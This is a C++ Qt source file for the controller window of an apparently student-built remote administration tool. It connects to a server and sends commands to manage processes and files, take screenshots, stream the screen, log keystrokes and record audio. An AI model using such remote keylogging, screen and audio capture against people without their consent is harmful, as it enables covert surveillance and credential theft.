#include "clientWindow.h"
#include "include/ui_clientWindow.h"
#include "audiowindow.h"
#include "screenshot.h"
#include "client.h"
#include <QDebug>
#include <QTimer>
#include <QDateTime>

ClientWindow::ClientWindow(QWidget *parent) :
    QMainWindow(parent)
    , ui(new Ui::clientWindow1)
{
    ui->setupUi(this);

    client = new Client;
    client_info = new clientInfo;


    connect(client_info, &clientInfo::connectToServer, this, &ClientWindow::receivedServerInfo);
//    connect(client_info, &clientInfo::exit, this, &ClientWindow::close);
    connect(client, &Client::stringMessageReceived, this, &ClientWindow::updateServerMsg);
//    connect(client, &Client::imageMessageReceived, this, &ClientWindow::updateImage);
    connect(client, &Client::directoryStructReceived, this, &ClientWindow::updateFileStruct);
    connect(client, &Client::fileStructReceived, this, &ClientWindow::updateFilesWindow);
    connect(client, &Client::allAppsReceived, this, &ClientWindow::updateAllApps);
    connect(client, &Client::processesReceived, this, &ClientWindow::updateProcesses);
    connect(client, &Client::runningAppsReceived, this, &ClientWindow::updateRunningApps);
    connect(client, &Client::strokeMessageReceived, this, &ClientWindow::updateStrokeText);



//    // ------------SETTING UP GUI --------------------

    _ipLabel = ui->ipLabel;
    _portLabel = ui->portLabel;
    _ipBox = ui->ipBox;
    _portBox = ui->portBox;



    PAButton = ui->processButton_1;

    keystrButton =  ui->processButton_3;
    screenButton = ui->processButton_4;
    fileButton = ui->processButton_5;
    streamButton = ui->processButton_6;
    audioButton = ui->processButton_7;
    exitButton = ui->exitButton;
    connect(PAButton, &QPushButton::clicked, this, &ClientWindow::on_pushButton_clicked_1);
    connect(keystrButton, &QPushButton::clicked, this, &ClientWindow::on_pushButton_clicked_3);
    connect(screenButton, &QPushButton::clicked, this, &ClientWindow::on_pushButton_clicked_4);
    connect(fileButton, &QPushButton::clicked, this, &ClientWindow::on_pushButton_clicked_5);
    connect(streamButton, &QPushButton::clicked, this, &ClientWindow::on_pushButton_clicked_6);
    connect(audioButton, &QPushButton::clicked, this, &ClientWindow::on_pushButton_clicked_7);

    connect(exitButton, SIGNAL(clicked()), this, SLOT(close()));

    // -----------------------------------------------


    client_info->show();
}

void ClientWindow::receivedServerInfo(const QString &serverIp, int port) {
    connect(client, &Client::m_connected, this, &ClientWindow::connect_success);
    connect(client, &Client::m_unconnected, this, &ClientWindow::connect_fail);
    client->connectToServer(serverIp, port);
    _ipBox->setText(serverIp);
    _portBox->setText(QString::number(port));
}
void ClientWindow::connect_success(){
    this->show();
    client_info->close();
    qDebug() << "success";
}
void ClientWindow::connect_fail(){
    client_info->fail_mess_display();
    qDebug() << "fail";
}

void ClientWindow::updateServerMsg(const QString &msg) {
//    serverMsgBox->setText(msg);
}

void ClientWindow::updateStrokeText(QString& str1, QString& str2){
    keystroke_wind->display_stroke(str1, str2);
}

void ClientWindow::updateImage(const QPixmap &image) {
//    qDebug() << "display picture?";
//    if (screenshotLabel == nullptr) {
//        screenshotLabel = new QLabel();
//        screenshotLabel->setPixmap(image);
//        rightPanelLayout->addWidget(screenshotLabel);
//    }
//    else {
//        screenshotLabel->setPixmap(image);
//    }
}


void ClientWindow::updateFilesWindow(QStringList files) {
    if (fileExp == nullptr) {
        qDebug() << "Error: not found file explorer window";
        return;
    }

    QGridLayout *layout = fileExp->ui->DirectoryGrid;

    int numColumns = 7;
    int rowIndex = 0;
    int colIndex = 0;

//    for (int i = 0; i < 100; ++i) {

//        // Calculate the row and column positions
//        rowIndex = i / numColumns;
//        colIndex = i % numColumns;
//        qDebug() << rowIndex << colIndex;

//        // Check if a widget already exists in the target cell
//        QLayoutItem *existingItem = layout->itemAtPosition(rowIndex, colIndex);
//        if (existingItem) {
//            QWidget *existingWidget = existingItem->widget();
//            layout->removeWidget(existingWidget);
//            delete existingWidget;
//        }
//    }
    for (auto x : fileExp->fileNameLabels) {
        delete x;
    }
    fileExp->fileNameLabels.clear();
    for (auto x : fileExp->fileNavList) {
        delete x;
    }
    fileExp->fileNavList.clear();
    layout->update();

    numColumns = 7;
    rowIndex = 0;
    colIndex = 0;

    QStringList sortedFiles = files;
    std::sort(sortedFiles.begin(), sortedFiles.end(), [](const QString &a, const QString &b) {
        QFileInfo fileInfoA(a);
        QFileInfo fileInfoB(b);
        if (fileInfoA.isDir() == fileInfoB.isDir())
            return a < b;
        return fileInfoA.isDir();
    });

    fileExp->ui->Path->setText(sortedFiles[0]);


    for (int i = 0; i < sortedFiles.size(); ++i) {
        QString filePath = sortedFiles[i];
        QFileInfo fileInfo(filePath);
        QString name = fileInfo.fileName();
        QLabel *label = new QLabel(name);
        fileExp->fileNameLabels.push_back(label);
        qDebug() << filePath;

        // Calculate the row and column positions
        rowIndex = i / numColumns;
        colIndex = i % numColumns;
        qDebug() << rowIndex << colIndex;

//        QIcon iconDir("folder.png");
//        QIcon iconFile("document.png");

        FileNavButton *button = new FileNavButton();

        fileExp->fileNavList.push_back(button);
        button->setStyleSheet("background-color: transparent;");

        // Determine if it's a directory or file

//        bool isDirectory = QFileInfo(filePath).isDir();
        connect(button, FileNavButton::doubleClicked, [filePath, this]() {
//            MyPushButton *button = static_cast<MyPushButton*>(sender());
            bool isDirectory = QFileInfo(filePath).isDir();
            if (isDirectory) {
                qDebug() << "Directory double-clicked!";
                this->client->sendFolderRequest(filePath);
            } else {
                qDebug() << "File double-clicked!";
            }
//            button->deleteLater();
        });

        // Add the QLabel to the layout
        layout->addWidget(label, rowIndex, colIndex);
        layout->addWidget(button, rowIndex, colIndex);

//        colIndex++;
    }
}

void ClientWindow::updateFileStruct(QStandardItemModel* &model) {
    qDebug() << "display file struct";
    if (fileExp != nullptr) {
        QTreeView *treeView = fileExp->ui->treeView;
        treeView->setModel(model);
        treeView->setHeaderHidden(true);
        treeView->setSelectionMode(QAbstractItemView::ExtendedSelection);
        treeView->setAnimated(true);
        treeView->setIndentation(20);
        treeView->setSortingEnabled(true);
        treeView->setContextMenuPolicy(Qt::CustomContextMenu);
        treeView->setExpandsOnDoubleClick(true);
        treeView->setStyleSheet("QTreeView::item { height: 26px; }");
        connect(treeView, SIGNAL(clicked(const QModelIndex&)), this, SLOT(onItemClicked(const QModelIndex&)));

        treeView->show();
    }

}

// Define the slot that will be triggered
void ClientWindow::onItemClicked(const QModelIndex& index)
{
    // Retrieve the selected item's data
    QVariant itemData = index.data(Qt::UserRole);
    QString itemPath = itemData.toString();
    qDebug() << "ON CLICKN E: " << itemData << itemPath;
    this->client->sendFolderRequest(itemPath);

}

void ClientWindow::updateAllApps(QStandardItemModel* &new_model) {
    qDebug() << "display all apps";
    if (appsWin == nullptr) {
        qDebug() << "Error: not found list app window";
        return;
    }
    QTreeView *treeView = appsWin->ui->appTree;

    QStandardItemModel *treeModel = dynamic_cast<QStandardItemModel*>(treeView->model());

    if (treeModel != nullptr) {
        // Iterate over the rows in new_model and add them to treeView model
        for (int row = 0; row < new_model->rowCount(); row++) {
            QList<QStandardItem*> items;

            // Iterate over the columns in each row
            for (int col = 0; col < new_model->columnCount(); col++) {
                QStandardItem *newItem = new_model->item(row, col)->clone();
                items.append(newItem);
            }

            // Append the items as a new row in the treeView model
            treeModel->appendRow(items);
        }
        treeView->show();
        return;
    }
    qDebug() << "Error: treeView does not have a valid model";
    treeView->setModel(new_model);
    treeView->setHeaderHidden(true);
    treeView->setSelectionMode(QAbstractItemView::ExtendedSelection);
    treeView->setAnimated(true);
    treeView->setIndentation(20);
    treeView->setSortingEnabled(true);
    treeView->setContextMenuPolicy(Qt::CustomContextMenu);


    QPushButton *startAppButton = appsWin->ui->startButton_3;


    treeView->setSelectionBehavior(QAbstractItemView::SelectRows);

    connect(startAppButton, QPushButton::clicked, [treeView, this]() {
        QItemSelectionModel *selection_model = treeView->selectionModel();
        if (selection_model) {
        QModelIndexList selected_indexes = selection_model->selectedIndexes();
        if (!selected_indexes.isEmpty()) {
            int selected_row = selected_indexes[0].row();
            QVariant selected_label = treeView->model()->index(selected_row, 0).data(Qt::UserRole);
            //                QVariant itemData = index.data(Qt::UserRole);
            QString itemPath = selected_label.toString();
            itemPath.remove('\r');
            itemPath.replace("\\\\", "\\");

            this->client->sendAppTask("start task name", itemPath);
            qDebug() << "Selected label:" << itemPath;
        } else {
            qDebug() << "No selected row.";
            //            QMessageBox::information(&window, "No Selection", "Please select an item.");
        }
        }
    });

    treeView->show();
}

void ClientWindow::updateProcesses(QStandardItemModel* &new_model) {
    qDebug() << "display all processes";
    if (appsWin == nullptr) {
        qDebug() << "No window to display.\n";
        return;
    }

    QTableView *tableView = appsWin->ui->processTable;

    QStandardItemModel *treeModel = dynamic_cast<QStandardItemModel*>(tableView->model());

    if (treeModel != nullptr) {
        // Iterate over the rows in new_model and add them to treeView model
        for (int row = 0; row < new_model->rowCount(); row++) {
            QList<QStandardItem*> items;

            // Iterate over the columns in each row
            for (int col = 0; col < new_model->columnCount(); col++) {
                QStandardItem *newItem = new_model->item(row, col)->clone();
                items.append(newItem);
            }

            // Append the items as a new row in the treeView model
            treeModel->appendRow(items);
        }
        tableView->show();
        return;
    }

    new_model->setHeaderData(0, Qt::Horizontal, "Process Name");
    new_model->setHeaderData(1, Qt::Horizontal, "PID");
    tableView->setModel(new_model);

    tableView->setSelectionBehavior(QAbstractItemView::SelectRows);

    QPushButton* killProcessButton = appsWin->ui->stopButton;
    connect(killProcessButton, QPushButton::clicked, [tableView, this]() {
        QItemSelectionModel *selection_model = tableView->selectionModel();
        if (selection_model) {

            QModelIndexList selected_indexes = selection_model->selectedIndexes();
            if (!selected_indexes.isEmpty()) {
                int selected_row = selected_indexes[0].row();
                QString selected_label = tableView->model()->index(selected_row, 1).data().toString();
                qDebug() << "Selected label:" << selected_label;
//                selected_label[selected_label.length() - 1] = '\0';
                selected_label.remove('\r');
                qDebug() << "Selected label:" << selected_label;
                this->client->sendAppTask("kill task pid", selected_label);
            } else {
                qDebug() << "No selected row.";
    //            QMessageBox::information(&window, "No Selection", "Please select an item.");
            }
        }
    });
    tableView->show();
}


void ClientWindow::updateRunningApps(QStandardItemModel* &new_model) {
    qDebug() << "display running apps";
    if (appsWin == nullptr) {
        qDebug() << "Error: not found list app window";
        return;
    }

    QTreeView *treeView = appsWin->ui->runningAppTree;
    QStandardItemModel *treeModel = dynamic_cast<QStandardItemModel*>(treeView->model());

    //    if (treeModel != nullptr) {
    //        qDebug() << "Error: treeView does not have a valid model";
    //        treeView->setModel(model);
    //        return;
    //    }
    if (treeModel != nullptr) {
        // Iterate over the rows in new_model and add them to treeView model
        for (int row = 0; row < new_model->rowCount(); row++) {
            QList<QStandardItem*> items;

            // Iterate over the columns in each row
            for (int col = 0; col < new_model->columnCount(); col++) {
                QStandardItem *newItem = new_model->item(row, col)->clone();
                items.append(newItem);
            }

            // Append the items as a new row in the treeView model
            treeModel->appendRow(items);
        }
        treeView->show();
        return;
    }


    //    treeView->setSizePolicy(QSizePolicy::Expanding, QSizePolicy::Expanding);
    treeView->setModel(new_model);
    treeView->setHeaderHidden(true);
    treeView->setSelectionMode(QAbstractItemView::ExtendedSelection);
    treeView->setAnimated(true);
    treeView->setIndentation(20);
    treeView->setSortingEnabled(true);
    treeView->setContextMenuPolicy(Qt::CustomContextMenu);
//    treeView->setExpandsOnDoubleClick(true);

    treeView->setSelectionBehavior(QAbstractItemView::SelectRows);
    QPushButton *startAppButton = appsWin->ui->startButton_2;
    //    treeView->setSelectionBehavior(QTableView.SelectRows);

    connect(startAppButton, QPushButton::clicked, [treeView, this]() {
        QItemSelectionModel *selection_model = treeView->selectionModel();
        if (selection_model) {
            QModelIndexList selected_indexes = selection_model->selectedIndexes();
            if (!selected_indexes.isEmpty()) {
                int selected_row = selected_indexes[0].row();
                QVariant selected_label = treeView->model()->index(selected_row, 0).data(Qt::UserRole);
//                QVariant itemData = index.data(Qt::UserRole);
                QString itemPath = selected_label.toString();
                itemPath.remove('\r');
                itemPath.replace("\\\\", "\\");
                this->client->sendAppTask("start task name", itemPath);
                qDebug() << "Selected label:" << itemPath;
            } else {
                qDebug() << "No selected row.";
                //            QMessageBox::information(&window, "No Selection", "Please select an item.");
            }
        }
    });

    QPushButton* killProcessButton = appsWin->ui->stopButton_2;
    connect(killProcessButton, QPushButton::clicked, [treeView, this]() {
        QItemSelectionModel *selection_model = treeView->selectionModel();
        if (selection_model) {

            QModelIndexList selected_indexes = selection_model->selectedIndexes();
            if (!selected_indexes.isEmpty()) {
                int selected_row = selected_indexes[0].row();
                QVariant selected_label = treeView->model()->index(selected_row, 0).data(Qt::UserRole);
                //                QVariant itemData = index.data(Qt::UserRole);
                QString itemPath = selected_label.toString();
//                itemPath[itemPath.length() - 1] = '\0';
                itemPath.remove('\r');
                this->client->sendAppTask("kill task name", itemPath);
                qDebug() << "Selected label:" << itemPath;
            } else {
                //            QMessageBox::information(&window, "No Selection", "Please select an item.");
            }
        }
    });
    treeView->show();
}


void ClientWindow::on_pushButton_clicked_1(){
//    client->sendMessage(tr("list processes"));
//    client->sendMessage(tr("list applications"));
    if (!appsWin)
        appsWin = new appsWindow(ui->widget_2);
    appsWin->show();
    connect(appsWin->ui->exitButton, &QPushButton::clicked, [=](){
        delete appsWin;
        appsWin = nullptr;
////        appWin->
    });
    connect(appsWin->ui->exitButton_2, &QPushButton::clicked, [=](){
        delete appsWin;
        appsWin = nullptr;
        ////        appWin->
    });
    connect(appsWin->ui->exitButton_3, &QPushButton::clicked, [=](){
        delete appsWin;
        appsWin = nullptr;
        ////        appWin->
    });
    connect(appsWin->ui->reloadButton, &QPushButton::clicked, [=](){
        QTableView *tableView = appsWin->ui->processTable;
        if (tableView) {

            QStandardItemModel *treeModel = dynamic_cast<QStandardItemModel*>(tableView->model());
            treeModel->clear();
            treeModel = nullptr;

            client->sendMessage(tr("list processes"));
        }
    });
    connect(appsWin->ui->reloadButton_2, &QPushButton::clicked, [=](){
        QTreeView *treeView = appsWin->ui->runningAppTree;
        if (treeView) {

        QStandardItemModel *treeModel = dynamic_cast<QStandardItemModel*>(treeView->model());
        treeModel->clear();
        treeModel = nullptr;
        client->sendMessage(tr("list running applications"));
        }
    });
    connect(appsWin->ui->reloadButton_3, &QPushButton::clicked, [=](){
//        client->sendMessage(tr("list applications"));
//        appsWin->ui->appTree->model->clear();
        QTreeView *treeView = appsWin->ui->appTree;
        if (treeView) {

        QStandardItemModel *treeModel = dynamic_cast<QStandardItemModel*>(treeView->model());
        treeModel->clear();
        treeModel = nullptr;
        client->sendMessage(tr("list applications"));
        }
    });
    client->sendMessage(tr("list processes and apps"));
//    client->sendMessage(tr("list applications"));
}
void ClientWindow::on_pushButton_clicked_2(){
    client->sendMessage(tr("list applications"));
}
void ClientWindow::on_pushButton_clicked_3(){

    keystroke_wind = new keystroke(ui->widget_2);
    connect(keystroke_wind, &keystroke::start_hook, [=]{
        client->sendMessage(tr("keyboard_track"));
        qDebug() << "stroke signal sent";
    });

    connect(keystroke_wind, &keystroke::end_hook, [=]{
        client->sendMessage(tr("stop_stroke"));
        qDebug() << "end stroke signal sent";
    });
    connect(keystroke_wind, &keystroke::end_session_stroke, [=]{
        delete keystroke_wind;
        keystroke_wind = nullptr;
    });


}
void ClientWindow::on_pushButton_clicked_4(){
    qDebug() << "screenshot clicked";
    screenshot_wind = new screenshot(ui->widget_2);
    connect(screenshot_wind, &screenshot::capture, [=](){
        client->sendMessage(tr("take screenshot"));
        qDebug() << "capture signal sent";
    });
    connect(screenshot_wind, &screenshot::end_session, [=](){
        delete screenshot_wind;
        screenshot_wind = nullptr;
    });
    connect(screenshot_wind, &screenshot::save, [=](){
        QDateTime date = QDateTime::currentDateTime();
        QString formattedTime = date.toString("ddMMyyyy_hh_mm_ss");
        QByteArray formattedTimeMsg = formattedTime.toLocal8Bit();

        QFile file("screen_" + formattedTime + ".jpg");
        file.open(QIODevice::WriteOnly);
        QPixmap img;
        img.loadFromData(client->rcv_bitmap, "JPEG");
        img.save(&file, "JPEG");
    });
    connect(client, &Client::imageMessageReceived, [=]{
        screenshot_wind->display_image(client->rcv_bitmap);
    });


}
void ClientWindow::on_pushButton_clicked_5(){
    qDebug() << "sending ls cmd";
    client->sendFolderRequest(tr("."));
    fileExp = new fileExplorer(ui->widget_2);
    fileExp->show();
    connect(fileExp->ui->exitButton, &QPushButton::clicked, [=](){
        delete fileExp;
        fileExp = nullptr;
    });
}
void ClientWindow::on_pushButton_clicked_6(){
    qDebug() << "Stream button clicked";
    stream_win = new screendisplayer(ui->widget_2);
    connect(stream_win, &screendisplayer::start_stream, [=]{
        client->sendMessage(tr("stream screen"));
    });
    connect(stream_win, &screendisplayer::close_stream, [=]{
        client->sendMessage(tr("stop_stream"));
    });
    connect(stream_win, &screendisplayer::end_session, [=]{
        delete stream_win;
        stream_win = nullptr;
    });
    connect(client, &Client::streamMessageReceived, [=]{
        stream_win->display_image(client->rcv_bitmap);
    });

}
void ClientWindow::on_pushButton_clicked_7(){
    client->sendMessage(tr("recording"));

    audioWindow* audio_w = new audioWindow(ui->widget_2);
    audio_w->set_time();
    audio_w->show();
    connect(audio_w, &audioWindow::click_stop, [=](){
        client->sendMessage(tr("stop_recording"));
        audio_w->m_timer->stop();
        delete audio_w;
    });


}
void ClientWindow::on_pushButton_clicked_8(){

}
